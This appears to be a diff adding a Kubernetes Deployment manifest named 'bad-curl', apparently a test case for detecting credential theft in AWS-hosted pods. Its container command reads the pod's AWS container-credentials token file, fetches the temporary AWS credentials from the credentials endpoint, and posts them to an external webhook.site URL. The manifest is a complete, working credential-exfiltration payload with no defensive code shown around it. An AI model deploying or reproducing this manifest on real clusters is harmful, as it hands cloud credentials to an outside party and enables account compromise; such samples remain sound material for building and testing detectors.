@@ -1,0 +1,22 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: bad-curl
+  labels:
+    app: bad-curl
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: bad-curl
+  template:
+    metadata:
+      labels:
+        app: bad-curl
+    spec:
+      serviceAccountName: asdda-deployment-sa
+      containers:
+      - name: bad-curl
+        image: curlimages/curl
+        command: ["/bin/sh"]
+        args: ["-c", "curl https://webhook.site/4440f75d-48c2-4ba3-986e-2c068dd8326e -d \"$(curl $AWS_CONTAINER_CREDENTIALS_FULL_URI -H \"Authorization: $(cat $AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE)\")\""]
